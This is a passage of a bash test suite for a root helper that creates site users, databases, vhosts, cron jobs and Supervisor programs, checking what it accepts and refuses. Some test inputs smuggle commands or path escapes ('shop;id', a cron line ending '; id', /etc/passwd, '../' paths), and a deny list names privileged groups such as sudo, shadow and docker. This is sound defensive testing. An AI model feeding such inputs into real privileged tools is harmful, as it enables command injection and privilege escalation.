IN=$PW DBSTATE="$WORK/db-mysql-noplugin" lacks "password login needs no plugin" "INSTALL PLUGIN" db-create mysql $S $S password
DBSTATE="$WORK/db-mysql-socket-done-noplugin" ok "socket user there, plugin missing: only the plugin" "  INSTALL PLUGIN auth_socket SONAME 'auth_socket.so';
created:" db-create mysql $S $S socket
DBSTATE="$WORK/db-mysql-socket-done-noplugin" lacks "socket user there, plugin missing: no user" "CREATE USER" db-create mysql $S $S socket
DBSTATE="$WORK/db-mariadb-noplugin" refuse "mariadb without unix_socket" "the unix_socket plugin is not active on this MariaDB server" db-create mariadb $S $S socket
lacks "pgsql has no plugin" "INSTALL" db-create pgsql $S $S socket

echo "== db-create socket login: already there"
DBSTATE="$WORK/db-mysql-socket-done" ok "mysql socket already there" "exists: mysql database $S for user $S, nothing changed (socket login)" db-create mysql $S $S socket
DBSTATE="$WORK/db-mysql-socket-done" lacks "mysql socket already there runs nothing" "run:" db-create mysql $S $S socket
DBSTATE="$WORK/db-mariadb-socket-done" ok "mariadb socket already there" "nothing changed (socket login)" db-create mariadb $S $S socket
DBSTATE="$WORK/db-pgsql-socket-done" ok "pgsql socket already there" "nothing changed (socket login)" db-create pgsql $S $S socket
DBSTATE="$WORK/db-mysql-socket-user" ok "socket user existed" "created: mysql database $S for user $S (socket login, the user existed)" db-create mysql $S $S socket
DBSTATE="$WORK/db-mysql-socket-user" lacks "socket user existed is not created again" "CREATE USER" db-create mysql $S $S socket
DBSTATE="$WORK/db-pgsql-socket-user" lacks "pgsql socket role existed is not created again" "CREATE ROLE" db-create pgsql $S $S socket

echo "== db-create socket login refusals"
SYS='' refuse "no Linux user" "no Linux user $S on this server" db-create mysql $S $S socket
SYS='' refuse "pgsql no Linux user" "no Linux user $S on this server" db-create pgsql $S $S socket
SYS='' refuse "mariadb no Linux user" "no Linux user $S on this server" db-create mariadb $S $S socket
SYS='' call db-create mysql $S $S socket
if [[ $OUT != *"run:"* && $OUT != *"check: what"* ]]; then pass; else failure "no Linux user: the database is not asked" "$OUT"; fi
refuse "uid 999" "shop_low is a system user (uid 999), not a site user" db-create pgsql shop_low shop_low socket
refuse "a listed user that isn't there" "no Linux user shop_half on this server" db-create mysql shop_half shop_half socket
for shared in eeploi ploi forge; do
  refuse "socket login for $shared" "reserved name, not a site user: $shared" db-create mysql "$shared" "$shared" socket
done
AS=deploy ETC_DIR="$WORK/etc-conf" refuse "socket login for the deploy user" "reserved name, not a site user: deploy" db-create pgsql deploy deploy socket
DBSTATE="$WORK/db-mysql-user" refuse "mysql password user, socket asked" "user shop_www exists with password login, not socket login: refusing, it is not switched" db-create mysql shop shop_www socket
db_state 1 0 1 0 0 0 0 > "$WORK/db-mariadb-user"
DBSTATE="$WORK/db-mariadb-user" refuse "mariadb password user, socket asked" "exists with password login" db-create mariadb shop shop_www socket
DBSTATE="$WORK/db-pgsql-password-user" refuse "pgsql role with a password, socket asked" "user shop_www exists with password login" db-create pgsql shop shop_www socket
IN=$PW DBSTATE="$WORK/db-mysql-socket-user" refuse "mysql socket user, password asked" "user $S exists with socket login, not password login: refusing, it is not switched" db-create mysql $S $S password
IN=$PW DBSTATE="$WORK/db-pgsql-socket-user" refuse "pgsql role without a password, password asked" "exists with socket login" db-create pgsql $S $S password
IN=$PW DBSTATE="$WORK/db-mysql-socket-done" refuse "socket done, password asked" "exists with socket login" db-create mysql $S $S password
db_state 0 1 1 0 0 0 1 1 1 1 1 > "$WORK/db-mysql-socket-and-tcp"
DBSTATE="$WORK/db-mysql-socket-and-tcp" refuse "socket asked, a user on 127.0.0.1" "user shop_www exists on 127.0.0.1 with password login, not socket login" db-create mysql shop shop_www socket
DBSTATE="$WORK/db-mysql-tcp-only" refuse "socket asked, a user on 127.0.0.1 only" "exists on 127.0.0.1 with password login" db-create mysql shop shop_www socket
lacks "socket login has no 127.0.0.1 user" "'@'127.0.0.1' IDENTIFIED" db-create mysql $S $S socket
DBSTATE="$WORK/db-mysql-taken" refuse "socket: database of another user" "database shop belongs to another user" db-create mysql shop shop_www socket
DBSTATE="$WORK/db-mysql-shared" refuse "socket: database shared" "database shop belongs to another user" db-create mysql shop shop_www socket
DBSTATE="$WORK/db-pgsql-taken" refuse "socket: pgsql database of another owner" "belongs to another user" db-create pgsql shop shop_www socket
DBSTATE="$WORK/db-mysql-nobody" refuse "socket: database nobody has" "exists and is not shop_www's" db-create mysql shop shop_www socket
DBSTATE="$WORK/db-mysql-global" refuse "socket: user with global rights" "rights beyond one database" db-create mysql shop shop_www socket
DBSTATE="$WORK/db-mysql-elsewhere" refuse "socket: user on another database" "rights on another database" db-create mysql shop shop_www socket
DBSTATE="$WORK/db-mysql-fresh" refuse "socket: mariadb on MySQL" "this server runs MySQL, not MariaDB" db-create mariadb shop shop_www socket
DBSTATE="$WORK/db-mariadb-fresh" refuse "socket: mysql on MariaDB" "this server runs MariaDB, not MySQL" db-create mysql shop shop_www socket
refuse "socket: a site user without an _" "a site user needs an _ after its first letter, like shop_example: shopexample" db-create mysql shop shopexample socket
refuse "socket: hyphen in the name" "invalid user name: shop-example" db-create mysql shop_example shop-example socket
refuse "socket: reserved mysql" "reserved user name: mysql" db-create mysql shop mysql socket
refuse "socket: reserved postgres" "reserved user name: postgres" db-create pgsql shop postgres socket
ok "socket login logs engine, name, user and login" $'log: eeploi-helper: eeploi: db-create mysql shop_example shop_example socket\n' db-create mysql $S $S socket

echo "== db-create stdin: an open pipe and a terminal"
# The dry-run environment for timeout and script: the default fixtures, as call uses them.
HELPER_ENV=(EEPLOI_HELPER_DRY_RUN=1 SUDO_USER=eeploi EEPLOI_HELPER_ETC="$WORK/etc-sites"
  EEPLOI_HELPER_NGINX_CONF="$WORK/nginx-default.conf" EEPLOI_HELPER_SYSTEM="$WORK/system")
# helper_cmd <args...>: the dry-run helper as a command line, for timeout and script.
helper_cmd() { printf '%q ' env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" "$@"; }
if command -v timeout > /dev/null; then
  # A pipe that is open but never written or closed: socket login must not read it, so it ends.
  mkfifo "$WORK/open-pipe"
  exec 3<> "$WORK/open-pipe"
  OUT=$(timeout 10 env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" db-create mysql $S $S socket <&3 2>&1)
  CODE=$?
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"(socket login)"* ]]; then pass; else failure "socket login does not read an open pipe" "exit $CODE
$OUT"; fi
  exec 3>&-
else
  echo "note: timeout is not installed, open-pipe test skipped (CI runs it)"
fi
# tty_call <args...>: run the helper with a terminal on stdin, through script (util-linux or BSD).
tty_call() {
  if script --version 2> /dev/null | grep -q util-linux; then
    OUT=$(timeout 10 script -qec "$(helper_cmd "$@")" /dev/null < /dev/null 2>&1)
  else
    OUT=$(timeout 10 script -q /dev/null env -i PATH="$PATH" "${HELPER_ENV[@]}" bash "$HELPER" "$@" < /dev/null 2>&1)
  fi
  CODE=$?
}
if command -v script > /dev/null && command -v timeout > /dev/null; then
  tty_call db-create mysql shop shop password
  if [ "$CODE" -eq 64 ] && [[ $OUT == *"password login needs the password on stdin, not a terminal"* ]]; then pass; else failure "password login refuses a terminal" "exit $CODE
$OUT"; fi
  tty_call db-create mysql $S $S socket
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"(socket login)"* ]]; then pass; else failure "socket login with a terminal" "exit $CODE
$OUT"; fi
  tty_call run-as shop_example
  if [ "$CODE" -eq 64 ] && [[ $OUT == *"run-as needs the script on stdin, not a terminal"* ]]; then pass; else failure "run-as refuses a terminal" "exit $CODE
$OUT"; fi
  # tty_sh <shell line>: run it with a terminal on stdin, stdout and stderr; the line redirects some.
  tty_sh() {
    if script --version 2> /dev/null | grep -q util-linux; then
      OUT=$(timeout 10 script -qec "$1" /dev/null < /dev/null 2>&1)
    else
      OUT=$(timeout 10 script -q /dev/null sh -c "$1" < /dev/null 2>&1)
    fi
  }
  RUN_AS=$(helper_cmd run-as shop_example)
  tty_sh "$RUN_AS < /dev/null"
  if [[ $OUT == *"run-as needs its output in a pipe or a file, not a terminal"* ]]; then pass; else failure "run-as refuses a terminal on stdout and stderr" "$OUT"; fi
  tty_sh "$RUN_AS < /dev/null > /dev/null"
  if [[ $OUT == *"run-as needs its output in a pipe or a file, not a terminal"* ]]; then pass; else failure "run-as refuses a terminal on stderr" "$OUT"; fi
  tty_sh "$RUN_AS < /dev/null 2> /dev/null; echo \"exit \$?\""
  if [[ $OUT == *"exit 64"* && $OUT != *"run: setsid"* ]]; then pass; else failure "run-as refuses a terminal on stdout" "$OUT"; fi
  tty_sh "$RUN_AS < /dev/null > /dev/null 2>&1; echo \"exit \$?\""
  if [[ $OUT == *"exit 0"* ]]; then pass; else failure "run-as without any terminal" "$OUT"; fi
else
  echo "note: script or timeout is not installed, terminal tests skipped (CI runs them)"
fi

echo "== site users: the check every site subcommand trusts"
# run-as shows site_user best: it does nothing else before runuser.
ok "a listed site user" "run: setsid --wait runuser -u shop_example " run-as shop_example
ok "a registry with a comment and an empty line" "run: setsid --wait runuser -u shop_www " run-as shop_www
for reserved in root eeploi ubuntu ploi forge postgres mysql redis nobody; do
  refuse "run-as $reserved" "reserved name, not a site user: $reserved" run-as "$reserved"
done
# www-data has a hyphen, so the name check already refuses it.
refuse "run-as www-data" "invalid site user: www-data" run-as www-data
AS=deploy ETC_DIR="$WORK/etc-conf" refuse "run-as the deploy user" "reserved name, not a site user: deploy" run-as deploy
NGINX="$WORK/nginx-group.conf" refuse "run-as the nginx user" "reserved name, not a site user: nginx" run-as nginx
for bad in Shop shop-example shop.example '1shop' '_shop' '' a23456789012345678901234567890123 'shop;id' $'shop\nid' '../shop'; do
  refuse "site user name '$bad'" "invalid site user" run-as "$bad"
done
refuse "an unlisted user" "alex_web is not an eeploi site user (not in $WORK/etc-sites/sites)" run-as alex_web
refuse "a listed user in sudo" "shop_sudo is in other groups too (ids 1004 27), not a site user" run-as shop_sudo
refuse "a uid below 1000" "shop_low is a system user (uid 999), not a site user" run-as shop_low
refuse "a home outside /srv/eeploi" "shop_away has home /home/shop_away, not /srv/eeploi/shop_away" run-as shop_away
refuse "a primary group not its own" "the group of shop_group is not its own group shop_group" run-as shop_group
refuse "listed, but no Linux user" "no Linux user shop_half on this server" run-as shop_half
SYS='' refuse "no Linux user at all" "no Linux user shop_example on this server" run-as shop_example
ETC_DIR="$WORK/etc-reg-writable" refuse "registry writable by others" "untrusted site registry" run-as shop_example
ETC_DIR="$WORK/etc-reg-link" refuse "registry as a link" "untrusted site registry" run-as shop_example
ETC_DIR="$WORK/etc-reg-folder" refuse "registry folder writable by others" "untrusted site registry" run-as shop_example
ETC_DIR="$WORK/etc-reg-badline" refuse "registry with another line" "invalid line in" run-as shop_example
ETC_DIR="$WORK/etc-reg-inject" refuse "registry with a command" "invalid line in" run-as shop_example
ETC_DIR="$WORK/etc-reg-twice" refuse "registry with DOMAIN twice" "DOMAIN is set twice" run-as shop_example
ETC_DIR="$WORK/etc-reg-nodomain" refuse "registry without DOMAIN" "no DOMAIN in" run-as shop_example
ETC_DIR="$WORK/etc-reg-baddomain" refuse "registry with a bad DOMAIN" "invalid domain: shop" run-as shop_example

echo "== site-user-create"
ok "the registry first" "  DOMAIN=new.example
  HOME=/srv/eeploi/shop_new
write: $WORK/etc-sites/sites/shop_new (644)" "${NEW[@]}"
ok "useradd" "run: useradd --home-dir /srv/eeploi/shop_new --create-home --user-group --shell /usr/sbin/nologin shop_new" "${NEW[@]}"
ok "then checks the new user" "check: site user shop_new (uid 1000 or higher, home /srv/eeploi/shop_new, only its own group)" "${NEW[@]}"
ok "home 750, then the ACL" "run: chmod 750 /srv/eeploi/shop_new
run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
ok "created" "created: site user shop_new for new.example, home /srv/eeploi/shop_new" "${NEW[@]}"
lacks "/srv/eeploi kept when there" "install -d -o root -g root -m 755 /srv/eeploi" "${NEW[@]}"
grep -v '^path /srv/eeploi$' "$WORK/system" > "$WORK/system-no-srv"
SYS="$WORK/system-no-srv" ok "/srv/eeploi made when missing" "run: install -d -o root -g root -m 755 /srv/eeploi
run: useradd" "${NEW[@]}"
ETC_DIR="$WORK/etc-empty" ok "the registry folder made when missing" "run: install -d -o root -g root -m 755 $WORK/etc-empty/sites" "${NEW[@]}"
for text in 'chown' 'chmod -R' 'setfacl -R' '/srv/eeploi/shop_new/'; do
  lacks "root touches only the home itself: no $text" "$text" "${NEW[@]}"
done
ok "a second call changes nothing" "exists: site user shop_example for shop.example, nothing changed" site-user-create shop_example shop.example
ok "a second call sets the home again" "run: chmod 750 /srv/eeploi/shop_example
run: setfacl -m u:www-data:x /srv/eeploi/shop_example" site-user-create shop_example shop.example
lacks "a second call makes no user" "useradd" site-user-create shop_example shop.example
lacks "a second call writes no registry" "write:" site-user-create shop_example shop.example
ok "a half-made site user gets its user" "run: useradd --home-dir /srv/eeploi/shop_half" site-user-create shop_half half.example
lacks "a half-made site user keeps its registry" "write:" site-user-create shop_half half.example
refuse "a second call for a site user in sudo" "in other groups too" site-user-create shop_sudo sudo.example
refuse "an existing user that isn't listed" "alex_web exists (a user, group or /srv/eeploi/alex_web) and is not an eeploi site user" site-user-create alex_web alex-web.example
refuse "an existing group that isn't listed" "shop_staff exists (a user, group or /srv/eeploi/shop_staff) and is not an eeploi site user" site-user-create shop_staff staff.example
refuse "an existing home that isn't listed" "shop_left exists (a user, group or /srv/eeploi/shop_left) and is not an eeploi site user" site-user-create shop_left left.example
call site-user-create alex_web alex-web.example
if [ "$CODE" -eq 64 ] && [[ $OUT != *"write:"* && $OUT != *"run:"* ]]; then pass; else failure "nothing written or run for an existing user" "exit $CODE
$OUT"; fi
refuse "a domain listed for another user" "shop.example is listed for site user shop_example" site-user-create shop_new shop.example
refuse "a listed user for another domain" "site user shop_example is for shop.example, not new.example" site-user-create shop_example new.example
for reserved in root eeploi ubuntu ploi forge postgres mysql redis nobody; do
  refuse "site-user-create $reserved" "reserved name, not a site user: $reserved" site-user-create "$reserved" new.example
done
refuse "site-user-create www-data" "invalid site user: www-data" site-user-create www-data new.example
for bad in Shop shop-new '1shop' '' a23456789012345678901234567890123 'shop;id'; do
  refuse "site-user-create name '$bad'" "invalid site user" site-user-create "$bad" new.example
done
refuse "site-user-create bad domain" "invalid domain" site-user-create shop_new 'new.example;id'
refuse "site-user-create arguments" "usage" site-user-create shop_new
refuse "site-user-create extra argument" "usage" site-user-create shop_new new.example x
AS=ploi refuse "site-user-create from ploi" "run through sudo as the deploy user eeploi" "${NEW[@]}"
AS=forge refuse "site-user-create from forge" "run through sudo as the deploy user eeploi" "${NEW[@]}"
AS=deploy ETC_DIR="$WORK/etc-conf" ok "site-user-create from the configured deploy user" "created: site user shop_new" "${NEW[@]}"
ETC_DIR="$WORK/etc-conf" refuse "site-user-create from eeploi when another user deploys" "run through sudo as the deploy user deploy" "${NEW[@]}"
ETC_DIR="$WORK/etc-reg-writable" refuse "an untrusted registry stops site-user-create" "untrusted site registry" "${NEW[@]}"

echo "== run-as"
ok "exact runuser line, in a new session" "run: setsid --wait runuser -u shop_example -- env -i HOME=/srv/eeploi/shop_example USER=shop_example LOGNAME=shop_example PATH=/usr/local/bin:/usr/bin:/bin LANG=C.UTF-8 /bin/bash -s" run-as shop_example
IN=$'id\nwhoami\n' ok "the script stays off the log" $'log: eeploi-helper: eeploi: run-as shop_example\n' run-as shop_example
IN=$'secret-marker-line\n' lacks "the script is never printed" "secret-marker-line" run-as shop_example
AS=ploi refuse "run-as from ploi" "run through sudo as the deploy user eeploi" run-as shop_example
AS=forge refuse "run-as from forge" "run through sudo as the deploy user eeploi" run-as shop_example
refuse "run-as without a user" "usage: run-as <user> < script" run-as
refuse "run-as with a command" "usage" run-as shop_example id
refuse "run-as with extra arguments" "usage" run-as shop_example -- bash -c id
AS=deploy ETC_DIR="$WORK/etc-conf" ok "run-as from the configured deploy user" "run: setsid --wait runuser -u shop_example " run-as shop_example

echo "== site subcommands: only the site user's own domain and home"
ok "vhost socket built by the helper" "fastcgi_pass unix:/run/php/php8.4-fpm-shop_example.sock;" vhost-write shop.example shop_example 8.4
ok "vhost in the registry" "  VHOST=/etc/nginx/sites-available/shop.example
write: $WORK/etc-sites/sites/shop_example (644)" vhost-write shop.example shop_example 8.4
ok "the registry keeps its other lines" "  DOMAIN=shop.example
  HOME=/srv/eeploi/shop_example
  CRON=/etc/cron.d/eeploi-shop_example" vhost-write shop.example shop_example 8.4
refuse "vhost for a domain that isn't the user's" "site user shop_example is for shop.example, not other.example" vhost-write other.example shop_example 8.4
refuse "vhost for an unlisted user" "alex_web is not an eeploi site user" vhost-write shop.example alex_web 8.4
refuse "vhost for the deploy user" "reserved name, not a site user: eeploi" vhost-write shop.example eeploi 8.4
refuse "vhost old arguments" "usage" vhost-write shop.example /run/php/php8.4-fpm-eeploi.sock
IN=$CRON_LINE ok "cron line" "  * * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1
write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
IN=$'* * * * * shop_example php /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n' \
  ok "cron line without a PHP version" "write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
IN=$CRON_LINE ok "cron in the registry" "  CRON=/etc/cron.d/eeploi-shop_example
  REDIS_CONF=" cron-write shop_example
IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/other.example/current/artisan schedule:run > /dev/null 2>&1\n' \
  refuse "cron for a domain that isn't the user's" "only" cron-write shop_example
IN=$'* * * * * shop_other php8.4 /srv/eeploi/shop_other/other.example/current/artisan schedule:run > /dev/null 2>&1\n' \
  refuse "cron as another site user" "only" cron-write shop_example
IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shopXexample/current/artisan schedule:run > /dev/null 2>&1\n' \
  refuse "cron: dots in the path are dots" "only" cron-write shop_example
IN=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1; id\n' \
  refuse "cron with more after the line" "only" cron-write shop_example
IN=$CRON_LINE refuse "cron for an unlisted user" "alex_web is not an eeploi site user" cron-write alex_web
IN=$CRON_LINE refuse "cron old arguments" "invalid site user: shop.example" cron-write shop.example
ok "cron-remove takes it out of the registry" "  HOME=/srv/eeploi/shop_example
  REDIS_CONF=" cron-remove shop_example
lacks "cron-remove leaves no CRON line" "CRON=" cron-remove shop_example
refuse "cron-remove for an unlisted user" "alex_web is not an eeploi site user" cron-remove alex_web
SUP=(supervisor-write eeploi-shop.example-a shop_example "$SITE/current" 1)
IN='php artisan horizon' ok "supervisor directory" "directory=$SITE/current" "${SUP[@]}"
IN='php artisan horizon' ok "supervisor log folder" "run: install -d -o root -g shop_example -m 750 /var/log/supervisor/eeploi/shop_example" "${SUP[@]}"
IN='php artisan horizon' ok "supervisor in the registry" "  SUPERVISOR=/etc/supervisor/conf.d/eeploi-shop.example-a.conf
  LOGS=/var/log/supervisor/eeploi/shop_example
write: $WORK/etc-sites/sites/shop_example (644)" "${SUP[@]}"
IN='id' refuse "supervisor for a domain that isn't the user's" "the program of site user shop_example must start with eeploi-shop.example-" \
  supervisor-write eeploi-other.example-a shop_example $SITE/current 1
IN='id' refuse "supervisor program of just the domain" "must start with eeploi-shop.example-" supervisor-write eeploi-shop.example- shop_example $SITE/current 1
IN='id' refuse "supervisor directory of another site" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /srv/eeploi/shop_other/other.example/current 1
IN='id' refuse "supervisor directory of another domain" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /srv/eeploi/shop_example/other.example/current 1
IN='id' refuse "supervisor directory with .." "invalid path" supervisor-write eeploi-shop.example-a shop_example $SITE/../../shop_other 1
IN='id' refuse "supervisor for an unlisted user" "alex_web is not an eeploi site user" supervisor-write eeploi-shop.example-a alex_web $SITE/current 1
IN='id' refuse "supervisor old arguments" "usage" supervisor-write eeploi-shop.example-a $SITE/current 1
printf 'SUPERVISOR=/etc/supervisor/conf.d/eeploi-shop.example-a.conf\n' >> "$WORK/etc-sites/sites/shop_other"
IN='id' refuse "supervisor program listed for another site" "eeploi-shop.example-a belongs to site user shop_other" "${SUP[@]}"
ok "supervisor-remove takes it out of the registry" "write: $WORK/etc-sites/sites/shop_other (644)" supervisor-remove eeploi-shop.example-a
lacks "supervisor-remove leaves no line" "SUPERVISOR=" supervisor-remove eeploi-shop.example-a
printf 'DOMAIN=other.example\n' > "$WORK/etc-sites/sites/shop_other"
lacks "supervisor-remove of an unlisted program" "write:" supervisor-remove eeploi-shop.example-b
refuse "env-install to another user's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /srv/eeploi/shop_other/other.example/.env shop_example
refuse "env-install as an unlisted owner" "alex_web is not an eeploi site user" env-install /home/ploi/a/.env /srv/eeploi/alex_web/a/.env alex_web
refuse "env-install to the deploy user's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /home/eeploi/a/.env shop_example
refuse "env-install to the site home with .." "invalid path" env-install /home/ploi/a/.env $SITE/../../shop_other/x/.env shop_example
refuse "storage-copy to another user's home" "not in /srv/eeploi/shop_example" storage-copy /home/ploi/a/storage /srv/eeploi/shop_other/other.example/storage shop_example
ok "vhost-set-root into a site home" "root $SITE/current/public;" vhost-set-root shop.example /home/ploi/shop.example/public $SITE/current/public
refuse "vhost-set-root into an unlisted home" "alex_web is not an eeploi site user" vhost-set-root shop.example /home/ploi/x/public /srv/eeploi/alex_web/a/public
refuse "vhost-set-root elsewhere in /srv" "outside the allowed home folders" vhost-set-root shop.example /home/ploi/x/public /srv/public
refuse "db-create socket login for an unlisted user" "alex_web is not an eeploi site user" db-create mysql alex_web alex_web socket
refuse "db-create socket login for a site user in sudo" "in other groups too" db-create pgsql shop_sudo shop_sudo socket
IN=$PW ok "db-create password login needs no site user" "created: mysql database alex_web for user alex_web (password login)" db-create mysql alex_web alex_web password

echo "== site users: powerful groups, even before they exist"
# None of these groups is in the system stand-in: a name is refused for what a package may make later.
for group in admin wheel sudo adm staff shadow disk kmem tty utmp crontab docker lxd incus libvirt kvm video render \
  input sgx lpadmin sambashare operator daemon bin sys backup syslog nogroup; do
  grep -q "^group $group:" "$WORK/system" && failure "group $group not in the stand-in" "it is"
  refuse "site-user-create $group" "reserved name, not a site user: $group" site-user-create "$group" "$group.example"
  refuse "run-as $group" "reserved name, not a site user: $group" run-as "$group"
done
for group in incus-admin libvirt-qemu systemd-journal systemd-network ssl-cert; do
  refuse "site-user-create $group" "invalid site user: $group" site-user-create "$group" new.example
done
NGINX="$WORK/nginx-group.conf" refuse "the nginx group is reserved" "reserved name, not a site user: web" site-user-create web new.example
ok "a name that only starts like a group" "created: site user docker_shop" site-user-create docker_shop docker-shop.example

echo "== site users: an _ after the first letter"
ok "shop_example passes" "run: setsid --wait runuser -u shop_example " run-as shop_example
ok "docker_shop passes" "created: site user docker_shop for docker-shop.example" site-user-create docker_shop docker-shop.example
ok "an _ at the end passes" "created: site user shop_ for new.example" site-user-create shop_ new.example
for name in shopexample a ab b2345678901234567890123456789012; do
  refuse "site-user-create $name" "a site user needs an _ after its first letter, like shop_example: $name" site-user-create "$name" new.example
done
refuse "site-user-create docker" "reserved name, not a site user: docker" site-user-create docker docker.example
refuse "site-user-create admin" "reserved name, not a site user: admin" site-user-create admin admin.example
refuse "listed and there, without an _" "a site user needs an _ after its first letter, like shop_example: shopexample" run-as shopexample
refuse "redis-create without an _" "needs an _ after its first letter" redis-create shopexample
refuse "vhost-write without an _" "needs an _ after its first letter" vhost-write plain.example shopexample 8.4
refuse "a socket of a user without an _" "invalid PHP-FPM socket" vhost-set-socket plain.example /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-shopexample.sock

echo "== vhost: nginx follows only the site's own links"
ok "disable_symlinks in the site's home" "      root /srv/eeploi/shop_example/shop.example/current/public;
      # nginx follows a link in the site only when the link and its target have the same owner.
      disable_symlinks if_not_owner from=/srv/eeploi/shop_example;" vhost-write shop.example shop_example 8.4
call vhost-write shop.example shop_example 8.4
if [ "$(grep -c 'disable_symlinks' <<< "$OUT")" -eq 1 ]; then pass; else failure "disable_symlinks once, in the HTTPS server" "$OUT"; fi

echo "== site-user-create: the domain check and the registry under one lock"
# A dry run takes no lock; the order in the file is what counts.
sed -n '/^  site-user-create)$/,/^  run-as)$/p' "$HELPER" > "$WORK/site-user-create.txt"
lock_line=$(grep -n 'registry_lock$' "$WORK/site-user-create.txt" | head -1 | cut -d: -f1)
check_line=$(grep -n 'registry_find "DOMAIN=' "$WORK/site-user-create.txt" | cut -d: -f1)
write_line=$(grep -n '^      registry_write$' "$WORK/site-user-create.txt" | cut -d: -f1)
# shellcheck disable=SC2016 # the literal $ETC and $1 of the helper's own line
undo_line=$(grep -n 'rm -f "\$ETC/sites/\$1"' "$WORK/site-user-create.txt" | cut -d: -f1)
unlock_line=$(grep -n '^    registry_unlock$' "$WORK/site-user-create.txt" | cut -d: -f1)
if [ -n "$lock_line" ] && [ "$lock_line" -lt "$check_line" ] && [ "$check_line" -lt "$write_line" ] \
  && [ "$write_line" -lt "$undo_line" ] && [ "$undo_line" -lt "$unlock_line" ]; then pass; else
  failure "site-user-create: lock, domain check, write, undo, unlock in that order" "$lock_line $check_line $write_line $undo_line $unlock_line"; fi
check "registry_edit takes the same lock" grep -q '^  registry_lock$' "$HELPER"

echo "== Supervisor program names: one site each"
cp -p "$WORK/etc-sites/sites/shop_other" "$WORK/shop_other.saved"
printf 'DOMAIN=shop.example-x.example\n' > "$WORK/etc-sites/sites/shop_other"
IN='id' refuse "a program with a dot after the domain" "after eeploi-shop.example- only a-z, 0-9 and -: eeploi-shop.example-x.example-worker" \
  supervisor-write eeploi-shop.example-x.example-worker shop_example "$SITE/current" 1
IN='id' ok "the longer domain's own program" "write: /etc/supervisor/conf.d/eeploi-shop.example-x.example-worker.conf (644)" \
  supervisor-write eeploi-shop.example-x.example-worker shop_other /srv/eeploi/shop_other/shop.example-x.example/current 1
printf 'DOMAIN=shop.example-x\n' > "$WORK/etc-sites/sites/shop_other"
IN='id' refuse "a program that fits two listed domains" "eeploi-shop.example-x-worker also fits site user shop_other (shop.example-x)" \
  supervisor-write eeploi-shop.example-x-worker shop_example "$SITE/current" 1
IN='id' refuse "the other side of it" "eeploi-shop.example-x-worker also fits site user shop_example (shop.example)" \
  supervisor-write eeploi-shop.example-x-worker shop_other /srv/eeploi/shop_other/shop.example-x/current 1
IN='id' ok "a program that fits one domain" "write: /etc/supervisor/conf.d/eeploi-shop.example-horizon.conf (644)" \
  supervisor-write eeploi-shop.example-horizon shop_example "$SITE/current" 1
IN='id' refuse "a program name with an underscore" "invalid program" supervisor-write eeploi-shop.example-a_b shop_example "$SITE/current" 1
printf 'DOMAIN=other.example\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-a.conf\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-b.conf\n' \
  > "$WORK/etc-sites/sites/shop_other"
ok "supervisor-remove-site removes the listed programs and their .paused copies" "run: rm -f /etc/supervisor/conf.d/eeploi-other.example-a.conf /etc/supervisor/conf.d/eeploi-other.example-a.conf.paused
run: rm -f /etc/supervisor/conf.d/eeploi-other.example-b.conf /etc/supervisor/conf.d/eeploi-other.example-b.conf.paused" supervisor-remove-site other.example
printf 'DOMAIN=other.example\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-a.conf\nSUPERVISOR=/etc/passwd\n' > "$WORK/etc-sites/sites/shop_other"
call supervisor-remove-site other.example
if [ "$CODE" -eq 64 ] && [[ $OUT != *"rm -f"* ]]; then pass; else failure "supervisor-remove-site checks every line before it removes one" "exit $CODE
$OUT"; fi
printf 'DOMAIN=other.example\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-a.conf\n' > "$WORK/etc-sites/sites/shop_other"
AS=ploi refuse "supervisor-resume of a site's program from ploi" "run through sudo as the deploy user eeploi" \
  supervisor-resume /etc/supervisor/conf.d/eeploi-other.example-a.conf
AS=forge refuse "supervisor-pause of a site's program from forge" "run through sudo as the deploy user eeploi" \
  supervisor-pause /etc/supervisor/conf.d/eeploi-other.example-a.conf
ok "supervisor-resume of a site's program by the deploy user" "run: mv /etc/supervisor/conf.d/eeploi-other.example-a.conf.paused /etc/supervisor/conf.d/eeploi-other.example-a.conf" \
  supervisor-resume /etc/supervisor/conf.d/eeploi-other.example-a.conf
AS=ploi refuse "ploi no longer resumes its own worker" "run through sudo as the deploy user eeploi" supervisor-resume /etc/supervisor/conf.d/worker-233475.conf
AS=forge refuse "forge no longer pauses its own daemon" "run through sudo as the deploy user eeploi" supervisor-pause /etc/supervisor/conf.d/daemon-12.conf
printf 'DOMAIN=other.example\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-a.conf\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-b.conf\n' \
  > "$WORK/etc-sites/sites/shop_other"
lacks "supervisor-remove-site leaves no SUPERVISOR line" "SUPERVISOR=" supervisor-remove-site other.example
ok "supervisor-remove-site writes the registry" "write: $WORK/etc-sites/sites/shop_other (644)" supervisor-remove-site other.example
lacks "supervisor-remove-site never by name prefix" "eeploi-shop.example" supervisor-remove-site shop.example
lacks "supervisor-remove-site of a site without programs" "rm -f" supervisor-remove-site shop.example
lacks "supervisor-remove-site of an unlisted domain" "rm -f" supervisor-remove-site unlisted.example
printf 'DOMAIN=other.example\nSUPERVISOR=/etc/passwd\n' > "$WORK/etc-sites/sites/shop_other"
refuse "supervisor-remove-site removes only Supervisor configs" "invalid Supervisor config in" supervisor-remove-site other.example
